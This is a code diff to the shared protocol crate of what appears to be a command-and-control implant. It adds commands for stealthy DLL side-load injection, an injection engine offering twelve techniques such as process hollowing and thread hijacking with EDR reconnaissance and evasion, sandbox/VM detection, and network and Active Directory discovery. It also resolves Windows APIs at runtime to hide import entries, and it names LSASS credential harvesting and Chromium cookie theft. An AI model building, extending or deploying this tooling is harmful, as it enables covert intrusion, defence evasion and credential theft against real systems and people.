@@ -401,9 +401,51 @@ pub fn verify_mesh_certificate(
     Ok(())
 }
 
+/// Configuration for export forwarding in a side-loaded DLL.
+///
+/// Used by both build-time tools (e.g. `orchestra-side-load-gen`) to generate
+/// DLLs with legitimate-looking export tables, and at runtime by the agent's
+/// `inject_with_export_forwarding` path to perform OPSEC-safe injection that
+/// produces a side-loaded DLL with a legitimate export table in memory.
+#[derive(Serialize, Deserialize, Debug, Clone, Default, PartialEq)]
+pub struct ExportConfig {
+    /// Name of the real DLL to forward exports to (e.g. `"version.dll"`).
+    pub forward_target: String,
+    /// Named exports to forward (e.g. `["GetFileVersionInfoA"]`).
+    pub named_exports: Vec<String>,
+    /// Ordinal-only exports: `(ordinal, internal_name)`.
+    pub ordinal_exports: Vec<(u16, String)>,
+}
+
+/// A single sandbox/VM detection indicator produced by the scoring pipeline.
+///
+/// Each indicator represents one piece of evidence gathered during the
+/// sandbox detection sweep.  Indicators carry a weight that is summed to
+/// produce the overall sandbox score.
+#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
+pub struct SandboxIndicator {
+    /// High-level category of the indicator (e.g. `"hypervisor"`,
+    /// `"cloud_bios"`, `"timing"`, `"debugger"`, `"mac_prefix"`).
+    pub category: String,
+    /// Human-readable description of what was detected (e.g.
+    /// `"VMware BIOS detected"`).
+    pub detail: String,
+    /// Weight contributed to the overall sandbox score.  Higher weights
+    /// indicate stronger signals.
+    pub weight: u32,
+    /// How the indicator was obtained (e.g. `"registry"`, `"cpuid"`,
+    /// `"mac_prefix"`, `"timing"`, `"peb"`).
+    pub source: String,
+}
+
 /// The set of administrator-approved actions the agent is willing to perform.
 ///
 /// The protocol intentionally does **not** expose an "execute arbitrary shell
+/// Helper for serde default on `bool` fields that should default to `true`.
+fn default_true() -> bool {
+    true
+}
+
 /// command" variant. Scripts must be pre-registered on the endpoint and are
 /// referenced by name via [`Command::RunApprovedScript`].
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -434,6 +476,11 @@ pub enum Command {
     },
     Shutdown,
     DiscoverNetwork,
+    /// Full network discovery suite (P3-01).  The operation enum selects
+    /// one of the five discovery functions in `net_discovery`.
+    NetworkDiscovery {
+        operation: NetDiscoveryOp,
+    },
     CaptureScreen,
     SimulateKey {
         key: String,
@@ -885,6 +932,59 @@ pub enum Command {
         delay_secs: Option<u32>,
     },
 
+    /// DLL side-load injection with export forwarding.  Decrypts the payload
+    /// (same as `DllSideLoad`), opens the target process, resolves the forward
+    /// target DLL in the target process via PEB module walk, allocates memory
+    /// for the payload near the forward target, patches the payload's export
+    /// table entries to point to the real function addresses, and executes
+    /// via `NtCreateThreadEx`.  This produces a side-loaded DLL with a
+    /// legitimate export table in memory — a more OPSEC-safe path than
+    /// the basic `DllSideLoad` injector.
+    InjectSideLoad {
+        /// Target process ID.
+        pid: u32,
+        /// XChaCha20-Poly1305 encrypted payload blob.
+        payload: Vec<u8>,
+        /// Export forwarding configuration.
+        export_config: ExportConfig,
+    },
+
+    /// Unified injection via the injection engine.  Supports all 12
+    /// technique variants with automatic technique selection, EDR
+    /// reconnaissance, and fallback chains.  When `technique` is `None`
+    /// the engine auto-selects the stealthiest technique for the target
+    /// process.  When `technique` is specified, the engine uses it but
+    /// falls back through the ranked technique list on failure.
+    ///
+    /// The technique string format is one of:
+    ///   `"auto"` — auto-select (default)
+    ///   `"ProcessHollow"`, `"ModuleStomp"`, `"EarlyBirdApc"`,
+    ///   `"ThreadHijack"`, `"FiberInject"`, `"ContextOnly"`,
+    ///   `"TransactedHollowing"`, `"DelayedModuleStomp"`,
+    ///   `"ThreadPool"` — auto-variant thread pool injection
+    ///   `"ThreadPool:Work"`, `"ThreadPool:Timer"`, etc. — specific variant
+    ///   `"CallbackInjection"` — auto-API callback injection
+    ///   `"CallbackInjection:EnumSystemLocalesA"`, etc. — specific API
+    ///   `"SectionMapping"` — section mapping (auto exec method)
+    ///   `"SectionMapping:Direct"` — section mapping with specific exec method
+    ///   `"WaitingThreadHijack"` — waiting thread hijack
+    ///   `"NtSetInfoProcess"` — NtSetInformationProcess write bypass
+    ///
+    /// Returns `InjectionResult` on success.
+    UnifiedInject {
+        /// Process name to inject into (e.g. `"svchost.exe"`).
+        target_process: String,
+        /// Shellcode or PE payload bytes.
+        payload: Vec<u8>,
+        /// Technique to use. `None` or `"auto"` = auto-select.
+        #[serde(default)]
+        technique: Option<String>,
+        /// If true, use evasion-enhanced path with pre-injection
+        /// reconnaissance (ETW check, EDR module detection, timing jitter).
+        #[serde(default = "default_true")]
+        evade: bool,
+    },
+
     // ── Syscall emulation control (Windows only) ─────────────────────────
 
     /// Toggle user-mode NT kernel interface emulation at runtime.
@@ -975,6 +1075,30 @@ pub enum Command {
     /// files modified within the current session and applies cover
     /// timestamps from the configured reference file.
     SyncTimestamps,
+
+// ── Sandbox scoring (all platforms) ──────────────────────────────────
+
+    /// Run a comprehensive sandbox/VM detection sweep and return the full
+    /// indicator breakdown (category, detail, weight, source) together
+    /// with the total score and the threshold used.  This gives operators
+    /// a detailed report instead of just a boolean.
+    SandboxCheck,
+
+    /// Query the current state of the EDR bypass transform engine.
+    /// Returns a structured JSON snapshot including last scan/transform
+    /// counts, cumulative totals, skipped counter, and timestamp.
+    EdrBypassStatus,
+
+    /// Query the current state of the Evanesco page tracker subsystem.
+    /// Returns full telemetry including page counts, timing, and
+    /// encrypt/decrypt counters.  Requires operator-level access.
+    PageTrackerStatus,
+
+    /// Query a redacted version of page tracker state suitable for
+    /// lower-privilege consumers.  Returns only page counts
+    /// (total, encrypted, decrypted_rw, decoded_rx) with no timing
+    /// data, no counters, and no thresholds.
+    PageTrackerStatusRedacted,
 }
 
 /// AMSI bypass strategy selector.
@@ -1047,6 +1171,63 @@ pub enum LsaMethod {
     Auto,
 }
 
+/// Network discovery operation selector.
+///
+/// Each variant maps to a function in the `net_discovery` module and carries
+/// the parameters the operator must supply.  The feature is gated behind
+/// `network-discovery`; when that feature is not enabled the agent returns
+/// an error at dispatch time.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum NetDiscoveryOp {
+    /// Read the local ARP cache (`arp_scan`).
+    ArpScan,
+    /// TCP-probe a subnet for live hosts (`ping_sweep`).
+    PingSweep {
+        /// CIDR (e.g. `"192.168.1.0/24"`) or 3-octet prefix (`"192.168.1"`).
+        subnet: String,
+        /// Per-host TCP connect timeout in milliseconds.
+        #[serde(default = "default_timeout_ms")]
+        timeout_ms: u64,
+        /// Maximum number of in-flight probes.
+        #[serde(default = "default_max_concurrent")]
+        max_concurrent: usize,
+    },
+    /// Scan a single host for open TCP ports (`tcp_port_scan`).
+    TcpPortScan {
+        /// Target host IP address.
+        host: String,
+        /// Port list to scan.
+        ports: Vec<u16>,
+        /// Maximum number of concurrent connection attempts.
+        #[serde(default = "default_scan_concurrency")]
+        concurrency: usize,
+        /// Per-port TCP connect timeout in milliseconds.
+        #[serde(default = "default_timeout_ms")]
+        timeout_ms: u64,
+    },
+    /// Resolve the reverse DNS (PTR) name for an IP (`reverse_dns_lookup`).
+    ReverseDns {
+        /// IP address to look up.
+        ip: String,
+    },
+    /// Enumerate Active Directory SRV records (`ad_srv_discovery`).
+    AdSrvDiscovery {
+        /// Domain to query (e.g. `"corp.example.com"`).
+        domain: String,
+    },
+}
+
+fn default_timeout_ms() -> u64 {
+    3000
+}
+fn default_max_concurrent() -> usize {
+    64
+}
+fn default_scan_concurrency() -> usize {
+    128
+}
+
 /// Errors produced by [`CryptoSession`].
 #[derive(Debug, Error)]
 pub enum CryptoError {
@@ -1097,6 +1278,51 @@ const REKEY_INTERVAL: u64 = 10_000;
 
 // ── LockedSecret: mlock-protected, zeroizing secret wrapper ──────────────────
 
+// P0-12: Runtime-resolved VirtualLock/VirtualUnlock to avoid static IAT entries.
+#[cfg(windows)]
+mod virtual_lock {
+    use std::sync::OnceLock;
+
+    type FnVirtualLock = unsafe extern "system" fn(*const u8, usize) -> i32;
+    type FnVirtualUnlock = unsafe extern "system" fn(*const u8, usize) -> i32;
+
+    static VIRTUAL_LOCK: OnceLock<Option<FnVirtualLock>> = OnceLock::new();
+    static VIRTUAL_UNLOCK: OnceLock<Option<FnVirtualUnlock>> = OnceLock::new();
+
+    fn resolve_fn<T>(name: &[u8]) -> Option<T> {
+        unsafe {
+            let module = winapi::um::libloaderapi::GetModuleHandleA(
+                b"kernel32.dll\0".as_ptr() as *const i8,
+            );
+            if module.is_null() {
+                return None;
+            }
+            let proc = winapi::um::libloaderapi::GetProcAddress(module, name.as_ptr() as *const i8);
+            if proc.is_null() {
+                None
+            } else {
+                Some(std::mem::transmute_copy(&proc))
+            }
+        }
+    }
+
+    pub unsafe fn virtual_lock(ptr: *const u8, len: usize) -> i32 {
+        let f = VIRTUAL_LOCK.get_or_init(|| resolve_fn(b"VirtualLock\0"));
+        match f {
+            Some(f) => f(ptr, len),
+            None => 0,
+        }
+    }
+
+    pub unsafe fn virtual_unlock(ptr: *const u8, len: usize) -> i32 {
+        let f = VIRTUAL_UNLOCK.get_or_init(|| resolve_fn(b"VirtualUnlock\0"));
+        match f {
+            Some(f) => f(ptr, len),
+            None => 0,
+        }
+    }
+}
+
 /// Wrapper that keeps a secret byte buffer locked in RAM (`mlock` / `VirtualLock`)
 /// and zeroizes it on drop so it never ends up in swap or core dumps.
 ///
@@ -1133,11 +1359,7 @@ impl LockedSecret {
         }
         #[cfg(windows)]
         unsafe {
-            #[link(name = "kernel32")]
-            extern "system" {
-                fn VirtualLock(lpAddress: *const u8, dwSize: usize) -> i32;
-            }
-            if VirtualLock(ptr, len) == 0 {
+            if virtual_lock::virtual_lock(ptr, len) == 0 {
                 log::warn!("LockedSecret: VirtualLock({} bytes) failed", len);
             }
         }
@@ -1153,11 +1375,7 @@ impl LockedSecret {
         }
         #[cfg(windows)]
         unsafe {
-            #[link(name = "kernel32")]
-            extern "system" {
-                fn VirtualUnlock(lpAddress: *const u8, dwSize: usize) -> i32;
-            }
-            VirtualUnlock(ptr, len);
+            virtual_lock::virtual_unlock(ptr, len);
         }
     }
 }
@@ -1167,6 +1385,139 @@ impl Drop for LockedSecret {
         // Zeroize before unlocking.
         self.data.zeroize();
         self.unlock_memory();
+    }
+}
+
+/// Overwrite a byte slice with zeros using volatile writes.
+///
+/// Prevents the compiler from optimizing away the zeroing.
+/// Shared across crates so that modules (lsass_harvest, browser_data, etc.)
+/// don't each implement their own copy.
+pub fn secure_zero(slice: &mut [u8]) {
+    for byte in slice.iter_mut() {
+        unsafe { std::ptr::write_volatile(byte, 0) };
+    }
+    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+}
+
+/// Zeroize a `String` in place by overwriting its heap buffer with zeros.
+///
+/// The string is left in an unusable state (all zeros, length unchanged).
+/// Intended for clearing sensitive credential values after serialization.
+pub fn secure_zero_string(s: &mut String) {
+    unsafe {
+        let vec = s.as_mut_vec();
+        secure_zero(vec);
+    }
+}
+
+/// Owning wrapper that zeroizes key material on drop.
+///
+/// Unlike [`LockedSecret`] this does **not** lock pages in RAM (no mlock /
+/// VirtualLock).  Use this for short-lived session keys where the overhead
+/// of page-locking is not justified — e.g. a Chromium master key that lives
+/// for the duration of a single cookie-harvest operation.
+pub struct SecureKey {
+    data: Vec<u8>,
+}
+
+impl SecureKey {
+    /// Create a `SecureKey` by taking ownership of an existing `Vec<u8>`.
+    ///
+    /// The caller should discard any other copies of the key material
+    /// after calling this — the value is *moved*, not copied.
+    pub fn from_vec(v: Vec<u8>) -> Self {
+        Self { data: v }
+    }
+
+    /// Borrow the raw key bytes.
+    pub fn as_bytes(&self) -> &[u8] {
+        &self.data
+    }
+}
+
+impl Drop for SecureKey {
+    fn drop(&mut self) {
+        secure_zero(&mut self.data);
+    }
+}
+
+/// RAII buffer that zeroizes its contents on drop.
+///
+/// Use this for any temporary buffer that holds sensitive data (credentials,
+/// memory dumps, key material, etc.) to guarantee zeroization on **all**
+/// exit paths — including early returns and `?` propagation — without
+/// relying on manual `secure_zero()` calls at every return site.
+///
+/// Unlike [`SecureKey`] (fixed-length key wrapper) and [`LockedSecret`]
+/// (mlock-protected), this is a general-purpose growable buffer with no
+/// page-locking overhead.
+pub struct SecureBuffer {
+    data: Vec<u8>,
+}
+
+impl SecureBuffer {
+    /// Allocate a zero-filled buffer of `size` bytes.
+    pub fn new(size: usize) -> Self {
+        Self {
+            data: vec![0u8; size],
+        }
+    }
+
+    /// Borrow the buffer contents as a mutable slice.
+    pub fn as_mut_slice(&mut self) -> &mut [u8] {
+        &mut self.data
+    }
+
+    /// Borrow the buffer contents as an immutable slice.
+    pub fn as_slice(&self) -> &[u8] {
+        &self.data
+    }
+
+    /// Return the current length of the buffer.
+    pub fn len(&self) -> usize {
+        self.data.len()
+    }
+
+    /// Returns `true` if the buffer is empty.
+    pub fn is_empty(&self) -> bool {
+        self.data.is_empty()
+    }
+
+    /// Truncate the buffer to `new_len` bytes.
+    ///
+    /// If `new_len` is greater than the current length, this is a no-op.
+    pub fn truncate(&mut self, new_len: usize) {
+        self.data.truncate(new_len);
+    }
+
+    /// Return a raw pointer to the buffer's allocation.
+    pub fn as_mut_ptr(&mut self) -> *mut u8 {
+        self.data.as_mut_ptr()
+    }
+
+    /// Return a raw const pointer to the buffer's allocation.
+    pub fn as_ptr(&self) -> *const u8 {
+        self.data.as_ptr()
+    }
+}
+
+impl Drop for SecureBuffer {
+    fn drop(&mut self) {
+        secure_zero(&mut self.data);
+    }
+}
+
+impl std::ops::Deref for SecureBuffer {
+    type Target = [u8];
+    fn deref(&self) -> &[u8] {
+        &self.data
+    }
+}
+
+impl std::ops::DerefMut for SecureBuffer {
+    fn deref_mut(&mut self) -> &mut [u8] {
+        &mut self.data
     }
 }
 
@@ -1211,11 +1562,7 @@ impl CryptoInner {
         }
         #[cfg(windows)]
         unsafe {
-            #[link(name = "kernel32")]
-            extern "system" {
-                fn VirtualLock(lpAddress: *const u8, dwSize: usize) -> i32;
-            }
-            if VirtualLock(ptr, len) != 0 {
+            if virtual_lock::virtual_lock(ptr, len) != 0 {
                 self.key_locked = true;
             } else {
                 log::warn!("CryptoInner: VirtualLock(key, {} bytes) failed", len);
@@ -1240,11 +1587,7 @@ impl CryptoInner {
         }
         #[cfg(windows)]
         unsafe {
-            #[link(name = "kernel32")]
-            extern "system" {
-                fn VirtualUnlock(lpAddress: *const u8, dwSize: usize) -> i32;
-            }
-            VirtualUnlock(ptr, len);
+            virtual_lock::virtual_unlock(ptr, len);
         }
         self.key_locked = false;
     }
